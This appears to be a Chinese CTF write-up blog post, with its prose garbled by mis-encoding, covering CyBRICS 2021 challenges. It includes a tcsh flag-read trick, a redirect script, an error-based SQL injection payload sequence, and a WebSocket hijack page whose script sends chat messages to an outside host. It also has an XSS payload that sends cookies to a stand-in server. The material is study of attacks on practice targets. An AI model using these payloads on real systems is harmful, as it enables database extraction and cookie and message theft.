&lt;/blockquote>
&lt;p>Ëøô‰∏™È¢ò emmmmm
Âè™Ë¶Åssh‰∏ÄËøûÊé•Â∞±‰ºöËá™Âä®ÊâßË°å&lt;code>rm -rf /*&lt;/code>ÁöÑÊåá‰ª§ÔºåÂΩìÂèçÂ∫îËøáÊù•ÁöÑÊó∂ÂÄôÁ≥ªÁªüÂ∑≤ÁªèÂà†ÁöÑËøûlsÊåá‰ª§ÈÉΩ‰∏çÂâ©‰∫Ü&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729003620922.png" alt="image-20210729003620922">&lt;/p>
&lt;p>ÂÖàËØ¥ÈùûÈ¢ÑÊúüËß£ÂêßÔºöÂΩìËæìÂÖ•ËøûÊé•ÂØÜÁ†ÅÂêéÁ´ãÂàªctrl+c Âè™Ë¶ÅÂ§üÂø´ Â∞±ÊâßË°å‰∏ç‰∫Ü&lt;code>rm -rf /*&lt;/code>Ôºå‰πãÂêéÂ∞±ÂèØ‰ª•È°∫ÁïÖÁöÑÁ©øÊ¢≠‰∫éËøô‰∏™buildbox‰πãÈó¥Êãøflag‰∫Ü&lt;/p>
&lt;p>È¢ÑÊúüËß£ÂàôÊòØËøôÊ†∑ÁöÑÔºöÂΩìÁ≥ªÁªüÊâßË°åÂà†Èô§ÂëΩ‰ª§Âêé ÂæàÂ§öÂ§ñÈÉ®Êåá‰ª§ÈÉΩË¢´Âà†Èô§ ÈúÄË¶ÅÈÄöËøá‰ªÖÂâ©ÁöÑ‰∏Ä‰∫õÂÜÖÁΩÆÂáΩÊï∞ÂÆåÊàê&amp;quot;read&amp;quot;ÁöÑÂäüËÉΩÔºõ‰ªé‰πãÂâçÁöÑÊä•Èîô‰ø°ÊÅØÂèØÁü• buildbox‰ΩøÁî®ÁöÑÊòØtcshÔºåÂú®tcsh‰∏≠&lt;code>echo $&amp;lt;&lt;/code>ÂëΩ‰ª§Áõ∏ÂΩì‰∫é&lt;code>read&lt;/code>ÂáΩÊï∞ÔºåËØªÂÖ•Ê†áÂáÜËæìÂÖ•Âπ∂ËæìÂá∫Ôºõtcsh‰∏≠Âä†Êã¨Âè∑ÁöÑÂëΩ‰ª§ÈÉΩ‰ºöÂú®Â≠êshell‰∏≠ËøêË°åÔºõÊûÑÈÄ†payload &lt;code>(echo &amp;quot;$&amp;lt;&amp;quot;) &amp;lt; /etc/ctf/flag.txt&lt;/code>ÔºåÂç≥ ËØªÂèñflag.txtÂπ∂ËæìÂá∫&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729005544665.png" alt="image-20210729005544665">&lt;/p>
&lt;h2 id="ad-network-web-baby-50-pts">Ad Network (Web, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>We are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.&lt;/p>
&lt;p>&lt;a href="http://adnetwork-cybrics2021.ctf.su/">Adnetwork website&lt;/a>&lt;/p>
&lt;p>There is a flag 1337 redirects deep into the network&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>&lt;del>Ëøô‰∏™ÊàëÊòØ‰∏çÁü•ÈÅìÊÄé‰πàÂÅö‚Ä¶‚Ä¶È°µÈù¢‰∏äÁöÑ‰ªª‰ΩïÈìæÊé•ÈÉ®ÂàÜÈÉΩÊòØËá™Â∑±È°µÈù¢ÂÜÖÁöÑË∑≥ËΩ¨ÔºåÊèêÁ§∫ÁöÑÊòØredirectÈáçÂÆöÂêëÔºåÂèØÊòØÊäìÂåÖÂêéÊ≤°Êúâ302 ‰πüÊ≤°Êúâ‰∏ÄÁõ¥Âú®ÂÅöÈáçÂÆöÂêëÂëÄ Ë¶ÅÊÄé‰πàÁúãÂë¢Ôºü&lt;/del>&lt;/p>
&lt;p>emmmm Âú®ÊØîËµõÁ¨¨‰∫åÂ§©ÂÜçÊ¨°Â∞ùËØïÁöÑÊó∂ÂÄôÁî®burpÁöÑËá™Â∏¶ÁöÑchromiumÁöÑÊµèËßàÂô®Ôºà‰πãÂâçÊòØÁü•ÈÅìËøô‰∏™ ‰ΩÜÊòØÊ≤°ÊúâÁî®ËøáÔºâÊ¨∏ È°µÈù¢Â∑¶‰∏äËßíÊòæÁ§∫‰∫Ü‰∏Ä‰∏™gifÂõæ
Ëøô‰∏™ÂõæÂú®Êò®Â§©ÂÅöÁöÑÊó∂ÂÄôÁúãÂà∞Ôºå ÂÜÖÂÆπÊòØ &lt;em>awesome ad from adnetwork&lt;/em>Ôºå‰ΩÜÊòØedgeÊµèËßàÂô®Âú®Âä†ËΩΩËøô‰∏™ÂõæÁöÑÊó∂ÂÄô‰ºöËá™Âä®ÈòªÊ≠¢ ÊàëÂçïÁã¨Áúã‰∫ÜÂÜÖÂÆπ‰πüÊ≤°ÂèëÁé∞‰ªÄ‰πàÁâπÂà´ÁöÑ Â∞±Ê≤°ÊúâÊ≥®ÊÑèËøôÈáå„ÄÇ‰∫ãÂêéËßíÂ∫¶ÁúãËøôÈáå ÂÖ∂ÂÆû‰∏Ä‰∏™GifÂõæË¢´ÈòªÊ≠¢ËØ∑Ê±ÇÂ∫îËØ•ÊòØÂæàÂèçÂ∏∏ÁöÑ‰∫ãÊÉÖÔºåÂ∫îËØ•È¶ñÂÖàÂºïËµ∑Ê≥®ÊÑèÁöÑ&amp;hellip;&amp;hellip; &lt;del>ÔºàÈÉΩÊÄ™edge!!!&lt;/del>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725133924877.png" alt="image-20210725133924877">&lt;/p>
&lt;p>ÁÇπÂáªgif‰ºöÊúâÂçïÁã¨ÁöÑÂºπÁ™óÂá∫Êù•ÔºåÊèêÁ§∫ÈáçÂÆöÂêëÊ¨°Êï∞ËøáÂ§öÔºõÁúãburp‰∏≠ÁöÑÊäìÂåÖËÆ∞ÂΩï Á°ÆÂÆûÂ§öÁöÑÁ¶ªË∞±ÔºåÊåâÁÖßÈ¢òÁõÆ‰∏≠ÁöÑÊèêÁ§∫ ÂæóÊúâ1337Â±ÇÔºåÂæó‰∏ä‰∏™ËÑöÊú¨ÊÖ¢ÊÖ¢Ë∑ë‰∫Ü Ëøô‰∏™ÊØîËæÉÂ•ΩÂºÑ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725134346221.png" alt="image-20210725134346221">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>emmm ÊØîËæÉÊÖ¢ÂÖ∂ÂÆû Â∫îËØ•ÊúâÂà´ÁöÑÁöÑÊñπÂºèÔºüÊúÄÂêéÁöÑflagÊòØ cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}&lt;/p>
&lt;p>ÊØîËµõÂÆå‰∫ÜÁúã‰∫ÜÂà´ÁöÑwp ËøôÂùóÂèØ‰ª•Áî®sessionËÆæÂÖÅËÆ∏ÈáçÂÆöÂêëÁöÑÊ¨°Êï∞ÔºåËøôÊ†∑Êõ¥Êñπ‰æø&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">max_redirects&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&amp;#34;&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="announcement-web-easy-60-pts">Announcement (Web, Easy, 60 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>Ladies and gentlemen!&lt;/p>
&lt;p>Allow us to introduce a brand new project ‚Äî
‚öê The Flag&lt;/p>
&lt;p>&lt;a href="http://announcement-cybrics2021.ctf.su/">Announcement website&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ÁÆÄÁ∫¶ÊºÇ‰∫ÆÁöÑÂâçÁ´Ø&lt;/p>
&lt;p>Êúâ‰∏™ËæìÂÖ•ÈÇÆÁÆ±ÁöÑÊ°ÜÔºåÊèê‰∫§‰ºöÂèëÈÄÅ‰∏Ä‰∏™postËØ∑Ê±ÇÔºödigest=xxxx&amp;amp;email=xxxx
Â∞ùËØï‰∏Ä‰∏™1@1.comÔºåÈáçÊîæÁöÑÊó∂ÂÄôÁõ¥Êé•‰øÆÊîπemailÂÄº‰ºöÊèêÁ§∫Invalid digestÔºåÂèëÁé∞ÂÖ∂‰∏≠digestÁöÑÂÄºÂ∞±ÊòØmd5(&amp;lsquo;&lt;a href="mailto:1@1.com">1@1.com&lt;/a>&amp;rsquo;) ÈöèemailËÄåÊîπÂèòÔºåÂ∞ùËØïÊ≥®ÂÖ•&lt;/p>
&lt;pre tabindex="0">&lt;code>digest=76af11f3eaf7b12e72d7d88e4cf2ee01&amp;amp;email='or'1 // ÂõûÊòæÊ≠£Â∏∏ Êó†Êä•Èîô
digest=c3593d255957d60d5d489ae682da8aee&amp;amp;email=1')# // Êä•ÈîôÔºöSomething went wrong during database insert: Column count doesn't match value count at row 1
digest=5c07c683d062d17ec799fa177ce88058&amp;amp;email=1',1)# // Êä•ÈîôÔºöSomething went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1
&lt;/code>&lt;/pre>&lt;p>Á°ÆÂÆöÊòØsqli Âπ∂‰∏îÂΩìÂâçË°®Êúâ‰∏§Âàó email+timestampÔºå‰ΩøÁî®ÁöÑËØ≠Âè•Â∫îËØ•ÊòØËøô‰∏™ÂêßÔºü&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">insert&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table_name&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">timestamp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">values&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">now&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂèØÂà©Áî®ÁöÑÈÉ®ÂàÜÊòØÂèØ‰ª•ÊèíÂÖ•ÁöÑemailÔºåÊä•ÈîôÊ≥®ÂÖ•&lt;/p>
&lt;pre tabindex="0">&lt;code>digest=e1e79bd6fafe38f7073ec1f3ef1513fa&amp;amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))# // Something went wrong during database insert: XPATH syntax error: '~announcement'
digest=c9f14624524736a74164cc6024fdefce&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~emails,logs'
digest=94707222b90505ab0aa5e1fd3916e77d&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~log'
digest=66bf6db11d9bee8e897b874a430f5704&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or ' // Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}'
&lt;/code>&lt;/pre>&lt;p>Ê≤°‰ªÄ‰πàÂ•ΩËØ¥ÁöÑÔºåÁªèÂÖ∏Êä•ÈîôÊ≥®ÂÖ•ÊµÅÁ®ãÔºöÁ°ÆÂÆöÂ≠óÊÆµÊï∞-&amp;gt;ÁàÜÊï∞ÊçÆÂ∫ìÂêç(announcement)-&amp;gt;Ë°®Âêç(emails, logs)-&amp;gt;Â≠óÊÆµÂêç(log)-&amp;gt;ÂÖ∑‰ΩìÊï∞ÊçÆ Êãøflag&lt;/p>
&lt;h2 id="multichat-web-medium-138-pts">Multichat (Web, Medium, 138 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>Yet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.&lt;/p>
&lt;p>Tip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): &amp;ldquo;&lt;code>Hey, i forgot the flag. Can you remind me?&lt;/code>&amp;rdquo;. Then admin will tell him the flag.&lt;/p>
&lt;p>&lt;a href="http://multichat-cybrics2021.ctf.su/">Multichat website&lt;/a>&lt;/p>
&lt;p>Team token for the support call: &lt;code>p32vhJKrnx_hajUc8nLTFw&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>ËÅäÂ§©ÂÆ§ÔºåadminÂíåtech supportÂú®‰∏Ä‰∏™ÁßòÂØÜÁöÑËÅäÂ§©ÂÆ§ÂÜÖÔºà10‰ΩçÊï∞Â≠óÁöÑÊàøÈó¥Âè∑ÔºâÔºåtech supportÂèØ‰ª•ËÆ©adminÁªôÂá∫flagÔºàÂêéÈù¢ÈÇ£‰∏™team token for the support callÊòØË¶ÅÁî®Âà∞ÂêóËøòÊòØÊÄé‰πàÊ†∑&lt;/p>
&lt;p>ÊäìÂåÖÔºåÁúãÂà∞‰∫Ü&lt;code>Connection: Upgrade&lt;/code> &lt;code>Upgrade: websocket&lt;/code>ÔºåËøô‰∏™ËÅäÂ§©ÂÆ§ÊòØÂª∫Á´ã‰∫Ü‰∏Ä‰∏™websocketËøûÊé•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724225447805.png" alt="image-20210724225447805">ÔºàwebsocketËøôÂùóÁü•ËØÜÂç∞Ë±°‰∏≠‰πãÂâçÊé•Ëß¶Ëøá‰∏ÄÊ¨° ‰πüÂ∞±‰∏ÄÊ¨° Áõ∏ÂÖ≥ÈìæÊé•ËøòÊòØÊîæÂêéÈù¢&lt;/p>
&lt;p>ÈìæÊé•ÈáåÁöÑ‰∏Ä‰∏™csrfÊîªÂáªÁöÑÂÆû‰æãË∑üËøô‰∏™ÊúâÁÇπÂÉè‰∫Ü&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724232946228.png" alt="image-20210724232946228">&lt;/p>
&lt;p>‰ΩÜÊòØËøôÈáåÁöÑÂèà‰∏çÂ§™‰∏ÄÊ†∑ÔºåwebsocketÊúÄÂàùÂª∫Á´ãÊó∂ÁöÑhttpÈÉ®ÂàÜ cookie‰∏≠ÊúâchatroomÁöÑidÔºåËøô‰∏™ÂÄºÊòØÊú™Áü•ÁöÑÔºà&lt;em>Admin and tech support are members of a secret chat room.&lt;/em>ÔºâÔºõÂè¶Â§ñtech supportÊòØÂÖà‰ºöÂèë*‚ÄòHey, i forgot the flag. Can you remind me?‚Äô*ÔºåÈúÄË¶ÅÁöÑÊòØËß¶ÂèëÔºàÂ¶ÇÊûúÂÆÉ‰∏ç‰ºöËá™Â∑±ÂèëËøô‰∏ÄÊù°ÂÜÖÂÆπÁöÑËØùÔºâÂíåÁõëÂê¨ÂÆÉÁöÑ‰ø°ÊÅØ ÁÑ∂ÂêéÊçïÊçâÂà∞ÂÆÉÁöÑ‰∏ã‰∏ÄÊù°adminÂèëÈÄÅÁöÑÂÜÖÂÆπÔºåÊãøÂà∞flag&lt;/p>
&lt;p>ÔºàÊØîËµõÁöÑÊó∂ÂÄôÂ∞±ÊÉ≥Âà∞ËøôÈáåÔºåÂÖ∑‰ΩìÁöÑÂÆûÁé∞‰∏çÁü•ÈÅìËØ•ÊÄé‰πàÂºÑ‰∫ÜÔºå‰ª•‰∏ãÊòØÁúã‰∫Üwp‰πãÂêéÁöÑÂ§çÁé∞Ôºâ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001013129.png" alt="image-20210728001013129">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001122843.png" alt="image-20210728001122843">&lt;/p>
&lt;p>5000Á´ØÂè£Â§ÑÊúâSupportÈ°µÈù¢Ôºåtech supportÂú®ËøôÈáåÂèØ‰ª•ËÆøÈóÆ‰ªªÊÑèÁöÑÈ°µÈù¢Âπ∂Âª∫Á´ãwebsocketÂèëÈÄÅÊ∂àÊÅØÔºå‰∏çÈôêÂà∂Ë∑®Âüü ÊâÄ‰ª•ÂèØ‰ª•Â∞ÜËá™Â∑±ÁöÑÁΩëÁ´ôÂÜôÂà∞ËøôÈáåÔºåsupport‰ºöÂ∏¶ÁùÄÂÆÉÁöÑcookieÔºàÂíåadminÂú®‰∏Ä‰∏™ÊàøÈó¥Èáå cookieÊòØÊàøÈó¥idÔºâËøáÊù•ËÆøÈóÆÔºåÁÑ∂ÂêéÂÄüÂä©jsÁöÑËÑöÊú¨ÊãøÂà∞ÂÆÉÁöÑcookieÔºõ‰ª•‰∏ãÊòØ&lt;a href="https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw">Êù•Ëá™w&amp;amp;mÁöÑËÑöÊú¨&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;text/javascript&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">WebSocket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ws://multichat-cybrics2021.ctf.su/ws&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onclose&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#ae81ff">1003&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`Status: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">reason&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Connection closed.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">item&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;connected&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onmessage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hey, i forgot the flag. Can you remind me?&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2000&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÊàñËÄÖÈùûÈ¢ÑÊúüËß£ÔºöÂú®urlÈÉ®ÂàÜËøõË°åxssÔºåpayload: &lt;code>javascript:location.href='http://vps/?cookie='+document.cookie&lt;/code>ÔºàÊ≠§Â§ÑÁî®ÁöÑÊòØburp collaboratorÔºâÁõ¥Êé•ÂèØ‰ª•Ëé∑ÂèñÊàøÈó¥Âè∑ÔºåËøûÂÖ•ÊàøÈó¥ÂêéÂèëÊ∂àÊÅØÂç≥ÂèØÊãøÂà∞flag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729144122926.png" alt="image-20210729144122926">&lt;/p>
